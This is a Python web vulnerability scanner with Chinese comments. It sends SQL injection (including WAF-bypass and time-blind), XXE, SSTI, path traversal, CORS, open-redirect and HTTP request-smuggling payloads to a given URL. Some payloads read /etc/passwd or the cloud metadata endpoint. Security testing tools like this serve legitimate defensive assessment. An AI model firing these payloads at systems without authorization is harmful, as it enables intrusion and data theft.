# -*- coding: utf-8 -*-
"""
中高危漏洞深度检测模块
"""

import requests
import re
import time
import json
import hashlib
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import SCAN_CONFIG


class CriticalScanner:
    """中高危漏洞扫描器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": SCAN_CONFIG["user_agent"],
        })
        self.vulnerabilities = []

    def scan(self, url: str) -> List[Dict]:
        """执行深度扫描"""
        print(f"[*] 中高危漏洞深度扫描: {url}")

        vulns = []

        # 1. SQL注入增强检测
        vulns.extend(self._sql_injection_advanced(url))

        # 2. 越权漏洞检测
        vulns.extend(self._idor_detection(url))

        # 3. 逻辑漏洞检测
        vulns.extend(self._logic_vulnerability(url))

        # 4. XXE漏洞检测
        vulns.extend(self._xxe_detection(url))

        # 5. SSTI模板注入检测
        vulns.extend(self._ssti_detection(url))

        # 6. 反序列化检测
        vulns.extend(self._deserialization_detection(url))

        # 7. CORS漏洞检测
        vulns.extend(self._cors_misconfiguration(url))

        # 8. 开放重定向增强
        vulns.extend(self._open_redirect_advanced(url))

        # 9. 路径遍历增强
        vulns.extend(self._path_traversal_advanced(url))

        # 10. HTTP请求走私
        vulns.extend(self._http_smuggling(url))

        self.vulnerabilities.extend(vulns)
        return vulns

    def _sql_injection_advanced(self, url: str) -> List[Dict]:
        """SQL注入增强检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        # WAF绕过Payload
        waf_bypass_payloads = [
            "' /*!50000union*/ /*!50000select*/ 1,2,3--",
            "' uni%6fn se%6cect 1,2,3--",
            "' unio%6e selec%74 1,2,3--",
            "' union%0aselect 1,2,3--",
            "' /**/union/**/select/**/ 1,2,3--",
            "' union(select(1),2,3)--",
            "1' OR 1=1 LIMIT 1-- -",
            "1' OR '1'='1' LIMIT 1-- -",
            "admin'--",
            "admin' #",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND BENCHMARK(5000000,SHA1('test'))--",
        ]

        # SQL报错特征（更全面）
        sql_errors = [
            "sql syntax", "mysql_fetch", "mysqli", "MariaDB",
            "ORA-", "Oracle", "SQL Server", "Microsoft OLE DB",
            "JET Database Engine", "Access Database Engine",
            "PostgreSQL", "sqlite3", "SQLite",
            "SQLSTATE", "Syntax error", "Unclosed quotation mark",
            "unterminated quoted string", "You have an error in your SQL syntax",
            "Warning: mysql", "MySqlException", "valid MySQL result",
            "ORA-01756", "Oracle error", "SQL Server Driver",
            "SQLServer JDBC Driver", "SqlException",
            "ODBC SQL Server Driver", "ODBC Microsoft Access",
        ]

        for param_name, param_values in params.items():
            for payload in waf_bypass_payloads[:5]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15, verify=False)
                    elapsed = time.time() - start_time

                    body = response.text.lower()

                    # 检查SQL报错
                    for error in sql_errors:
                        if error.lower() in body:
                            vulns.append({
                                "type": "SQL注入",
                                "severity": "Critical",
                                "url": url,
                                "description": f"参数 {param_name} 存在SQL注入漏洞（WAF绕过）",
                                "evidence": f"Payload: {payload}\n响应包含: {error}",
                                "remediation": "使用参数化查询，部署WAF",
                                "poc": f"GET {test_url}"
                            })
                            break

                    # 时间盲注检测
                    if elapsed > 4:
                        vulns.append({
                            "type": "SQL注入(时间盲注)",
                            "severity": "Critical",
                            "url": url,
                            "description": f"参数 {param_name} 存在时间盲注",
                            "evidence": f"Payload: {payload}\n响应时间: {elapsed:.2f}s",
                            "remediation": "使用参数化查询"
                        })

                except Exception as e:
                    continue

        return vulns

    def _idor_detection(self, url: str) -> List[Dict]:
        """越权漏洞检测"""
        vulns = []
        parsed = urlparse(url)

        # 常见ID参数
        id_params = ["id", "uid", "user_id", "userId", "account", "no", "number", "order_id"]

        params = parse_qs(parsed.query)

        for param_name in params:
            if param_name.lower() in id_params:
                original_value = params[param_name][0]

                # 尝试修改ID值
                try:
                    # 尝试不同的ID值
                    test_ids = ["1", "2", "100", "0", "-1", "admin", "test"]

                    for test_id in test_ids[:2]:
                        if test_id == original_value:
                            continue

                        test_params = params.copy()
                        test_params[param_name] = [test_id]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        response = self.session.get(test_url, timeout=5, verify=False)

                        # 如果返回200且内容不同，可能存在越权
                        if response.status_code == 200 and len(response.text) > 100:
                            vulns.append({
                                "type": "越权漏洞",
                                "severity": "High",
                                "url": url,
                                "description": f"参数 {param_name} 可能存在越权访问",
                                "evidence": f"原始值: {original_value}\n测试值: {test_id}\n响应长度: {len(response.text)}",
                                "remediation": "实施权限验证，使用会话管理"
                            })
                            break

                except Exception as e:
                    continue

        return vulns

    def _logic_vulnerability(self, url: str) -> List[Dict]:
        """逻辑漏洞检测"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 密码重置逻辑漏洞
        reset_paths = ["/forgot-password", "/reset-password", "/password/reset", "/api/reset-password"]

        for path in reset_paths:
            full_url = urljoin(base, path)
            try:
                response = self.session.get(full_url, timeout=5, verify=False)
                if response.status_code == 200 and "password" in response.text.lower():
                    vulns.append({
                        "type": "逻辑漏洞",
                        "severity": "Medium",
                        "url": full_url,
                        "description": "发现密码重置接口，可能存在逻辑漏洞",
                        "evidence": f"响应长度: {len(response.text)}",
                        "remediation": "实施验证码、频率限制、token验证"
                    })
            except:
                continue

        # 注册逻辑漏洞
        register_paths = ["/register", "/signup", "/api/register", "/api/signup"]

        for path in register_paths:
            full_url = urljoin(base, path)
            try:
                response = self.session.get(full_url, timeout=5, verify=False)
                if response.status_code == 200 and "register" in response.text.lower():
                    vulns.append({
                        "type": "逻辑漏洞",
                        "severity": "Medium",
                        "url": full_url,
                        "description": "发现注册接口，可能存在逻辑漏洞",
                        "evidence": f"响应长度: {len(response.text)}",
                        "remediation": "实施验证码、频率限制、邮箱/手机验证"
                    })
            except:
                continue

        # 支付逻辑漏洞
        pay_paths = ["/pay", "/payment", "/checkout", "/order/submit", "/api/pay"]

        for path in pay_paths:
            full_url = urljoin(base, path)
            try:
                response = self.session.get(full_url, timeout=5, verify=False)
                if response.status_code == 200 and any(kw in response.text.lower() for kw in ["pay", "price", "amount"]):
                    vulns.append({
                        "type": "逻辑漏洞",
                        "severity": "High",
                        "url": full_url,
                        "description": "发现支付接口，可能存在支付逻辑漏洞",
                        "evidence": f"响应长度: {len(response.text)}",
                        "remediation": "服务端验证金额、数量、优惠券"
                    })
            except:
                continue

        return vulns

    def _xxe_detection(self, url: str) -> List[Dict]:
        """XXE漏洞检测"""
        vulns = []

        # XXE Payload
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
        ]

        # 检查是否有XML接口
        xml_paths = ["/api/xml", "/xml", "/soap", "/wsdl", "/api/soap"]

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in xml_paths:
            full_url = urljoin(base, path)
            try:
                # 发送XXE payload
                for payload in xxe_payloads[:1]:
                    response = self.session.post(
                        full_url,
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                        timeout=5,
                        verify=False
                    )

                    # 检查是否成功读取文件
                    if "root:" in response.text or "localhost" in response.text:
                        vulns.append({
                            "type": "XXE漏洞",
                            "severity": "Critical",
                            "url": full_url,
                            "description": "存在XXE漏洞，可读取服务器文件",
                            "evidence": response.text[:200],
                            "remediation": "禁用外部实体解析"
                        })
            except:
                continue

        return vulns

    def _ssti_detection(self, url: str) -> List[Dict]:
        """SSTI模板注入检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        # SSTI Payload
        ssti_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("#{7*7}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("{{config}}", "SECRET_KEY"),
        ]

        for param_name, param_values in params.items():
            for payload, indicator in ssti_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    response = self.session.get(test_url, timeout=5, verify=False)

                    # 检查是否成功执行
                    if indicator in response.text:
                        vulns.append({
                            "type": "SSTI模板注入",
                            "severity": "Critical",
                            "url": url,
                            "description": f"参数 {param_name} 存在SSTI漏洞",
                            "evidence": f"Payload: {payload}\n响应包含: {indicator}",
                            "remediation": "使用安全的模板引擎，过滤用户输入",
                            "poc": f"GET {test_url}"
                        })
                        break

                except Exception as e:
                    continue

        return vulns

    def _deserialization_detection(self, url: str) -> List[Dict]:
        """反序列化漏洞检测"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Java反序列化特征
        java_deserial_paths = [
            "/api/deserialize", "/api/object", "/api/serial",
            "/weblogic", "/jmx-console", "/invoker",
        ]

        # PHP反序列化特征
        php_deserial_paths = [
            "/api/unserialize", "/api/php",
        ]

        for path in java_deserial_paths + php_deserial_paths:
            full_url = urljoin(base, path)
            try:
                response = self.session.get(full_url, timeout=5, verify=False)

                # 检查是否有反序列化接口
                if response.status_code == 200:
                    if "serialize" in response.text.lower() or "deserialize" in response.text.lower():
                        vulns.append({
                            "type": "反序列化漏洞",
                            "severity": "Critical",
                            "url": full_url,
                            "description": "发现反序列化接口，可能存在RCE漏洞",
                            "evidence": f"响应长度: {len(response.text)}",
                            "remediation": "禁用反序列化，使用白名单"
                        })
            except:
                continue

        return vulns

    def _cors_misconfiguration(self, url: str) -> List[Dict]:
        """CORS配置错误检测"""
        vulns = []

        try:
            # 测试CORS配置
            headers = {"Origin": "https://evil.com"}
            response = self.session.get(url, headers=headers, timeout=5, verify=False)

            acao = response.headers.get("Access-Control-Allow-Origin", "")
            acac = response.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                vulns.append({
                    "type": "CORS配置错误",
                    "severity": "Medium",
                    "url": url,
                    "description": "CORS配置允许所有域名访问",
                    "evidence": f"Access-Control-Allow-Origin: {acao}",
                    "remediation": "限制CORS允许的域名白名单"
                })
            elif "evil.com" in acao:
                severity = "Critical" if acac == "true" else "High"
                vulns.append({
                    "type": "CORS配置错误",
                    "severity": severity,
                    "url": url,
                    "description": "CORS配置反射任意Origin",
                    "evidence": f"ACAO: {acao}\nACAC: {acac}",
                    "remediation": "验证Origin白名单，不要反射任意Origin"
                })

        except Exception as e:
            pass

        return vulns

    def _open_redirect_advanced(self, url: str) -> List[Dict]:
        """开放重定向增强检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # 重定向参数
        redirect_params = ["url", "redirect", "next", "return", "goto", "to", "out", "rurl", "dest",
                          "redirect_uri", "redirect_url", "return_url", "next_url", "continue"]

        # 测试域名
        test_domains = [
            "https://evil.com",
            "//evil.com",
            "javascript:alert(1)",
            "//evil.com/%2f..",
            "https://evil.com%00.example.com",
            "https://example.com@evil.com",
        ]

        for param_name in params:
            if param_name.lower() in redirect_params:
                for test_domain in test_domains[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [test_domain]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        response = self.session.get(test_url, timeout=5, allow_redirects=False, verify=False)

                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get("Location", "")
                            if "evil.com" in location or "javascript:" in location:
                                vulns.append({
                                    "type": "开放重定向",
                                    "severity": "Medium",
                                    "url": url,
                                    "description": f"参数 {param_name} 存在开放重定向漏洞",
                                    "evidence": f"重定向到: {location}",
                                    "remediation": "验证重定向目标域名白名单"
                                })
                                break

                    except Exception as e:
                        continue

        return vulns

    def _path_traversal_advanced(self, url: str) -> List[Dict]:
        """路径遍历增强检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # 路径遍历Payload（绕过过滤）
        traversal_payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
            ("..%252f..%252f..%252fetc/passwd", "root:"),
            ("..\\..\\..\\etc\\passwd", "root:"),
            ("../../../windows/system32/drivers/etc/hosts", "localhost"),
            ("....//....//....//windows/system32/drivers/etc/hosts", "localhost"),
            ("..%252f..%252f..%252fwindows/system32/drivers/etc/hosts", "localhost"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
        ]

        file_params = ["file", "path", "page", "include", "inc", "require", "load", "doc", "document", "template"]

        for param_name in params:
            if param_name.lower() in file_params:
                for payload, indicator in traversal_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        response = self.session.get(test_url, timeout=5, verify=False)

                        if indicator in response.text:
                            vulns.append({
                                "type": "路径遍历",
                                "severity": "Critical",
                                "url": url,
                                "description": f"参数 {param_name} 存在路径遍历漏洞",
                                "evidence": f"Payload: {payload}\n响应包含: {indicator}",
                                "remediation": "过滤路径遍历字符，使用白名单",
                                "poc": f"GET {test_url}"
                            })
                            break

                    except Exception as e:
                        continue

        return vulns

    def _http_smuggling(self, url: str) -> List[Dict]:
        """HTTP请求走私检测"""
        vulns = []

        # HTTP请求走私Payload
        smuggling_payloads = [
            # CL.TE
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            # TE.CL
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
        ]

        parsed = urlparse(url)
        host = parsed.netloc

        try:
            for payload_template in smuggling_payloads[:1]:
                payload = payload_template.format(host)

                # 发送原始请求
                import socket
                import ssl

                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                with socket.create_connection((host, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        ssock.send(payload.encode())
                        response = ssock.recv(4096)

                        if b"HTTP/1.1" in response:
                            vulns.append({
                                "type": "HTTP请求走私",
                                "severity": "High",
                                "url": url,
                                "description": "可能存在HTTP请求走私漏洞",
                                "evidence": "服务器接受了Transfer-Encoding头",
                                "remediation": "禁用Transfer-Encoding，使用HTTP/2"
                            })

        except Exception as e:
            pass

        return vulns


def scan_critical(url: str) -> List[Dict]:
    """便捷函数：中高危漏洞扫描"""
    scanner = CriticalScanner()
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        vulns = scan_critical(sys.argv[1])
        for vuln in vulns:
            print(f"[{vuln['severity']}] {vuln['type']}: {vuln['url']}")
            print(f"  描述: {vuln['description']}")
            print()
    else:
        print("用法: python critical_scanner.py <url>")
